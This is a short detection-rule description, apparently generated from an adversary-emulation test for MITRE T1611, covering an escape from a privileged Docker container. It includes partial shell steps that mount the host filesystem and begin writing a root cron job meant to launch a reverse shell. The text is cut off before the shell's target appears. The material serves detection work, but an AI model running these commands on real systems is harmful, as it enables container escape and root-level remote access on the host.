description = "Detection for specific test 'Mount host filesystem to escape privileged Docker container' (GUID: 6c499943-b098-4bc6-8d38-0956fc182984) of technique T1611 (Escape to Host). Test Description: This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell.. Command/Steps: if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \\\"* * * * * root /bin/bash -c '/bin/bash -c ec..."
